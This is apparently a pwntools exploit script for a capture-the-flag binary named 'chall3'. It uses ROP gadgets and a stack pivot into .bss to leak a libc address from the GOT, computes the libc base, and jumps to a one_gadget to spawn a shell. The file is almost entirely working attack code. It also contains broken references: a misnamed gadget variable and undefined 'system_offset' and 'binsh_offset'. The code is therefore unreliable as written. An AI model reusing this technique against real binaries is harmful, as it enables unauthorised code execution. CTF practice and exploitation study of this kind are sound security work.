from pwn import *
import sys

r = process('./chall3')
raw_input('debug')

read_offset = 0x0f7310
rop_rdi =  0x400863
buf_bss = 0x6010A0
read_got = 0x601030
rop_r12_r15 = 0x40085c 
main = 0x400724

payload = p64(1) + p64(rop_r12_15) + p64(0x601018) + p64(1) + p64(read_got) + p64(20) + p64(0x400840) + p64(0)*7 
payload += p64(main)
r.sendlineafter('Enter your name : ', payload)
payload = 'a'*0x10 + p64(buf_bss) + p64(0x4007f1)
r.sendafter('Enter some note : ', payload)
r.recvuntil('Have fun.')
r.recv(1)
read_add = u64(r.recv(6) + '\00'*2)
libc_base = read_add - read_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset
log.info('libc_base %#x' %libc_base)

payload = p64(0)
payload += p64(libc_base + 0x4527a) + p64(0)*7
r.sendlineafter('Enter your name : ', payload)
payload = 'a'*0x10 + p64(buf_bss) + p64(0x4007f1)
r.sendafter('Enter some note : ', payload)

r.interactive()
r.close()

# FLAG